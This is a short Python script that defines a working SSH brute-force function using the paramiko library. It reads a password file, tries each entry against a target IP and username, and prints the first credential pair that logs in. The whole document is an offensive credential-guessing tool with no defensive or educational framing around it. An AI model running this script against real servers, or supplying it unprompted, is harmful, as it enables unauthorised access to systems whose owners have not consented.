import paramiko

def brute_force_ssh(target_ip, username, password_file):
    with open(password_file, 'r') as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password)
            print(f"Success: {username}:{password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            pass
